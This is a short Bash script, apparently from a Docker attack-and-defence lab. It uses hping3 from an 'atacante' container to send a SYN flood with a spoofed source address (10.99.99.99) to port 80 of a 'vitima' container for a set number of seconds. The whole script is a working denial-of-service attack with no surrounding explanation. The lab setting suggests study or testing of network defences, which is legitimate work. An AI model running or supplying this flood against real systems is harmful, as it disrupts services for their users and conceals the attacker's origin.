#!/usr/bin/env bash
set -euo pipefail

duracao="${1:-20}"
origem_falsa="10.99.99.99"

echo "SYN flood contra a vitima por ${duracao}s"
docker exec atacante timeout "$duracao" hping3 -a "$origem_falsa" -S -p 80 --flood vitima
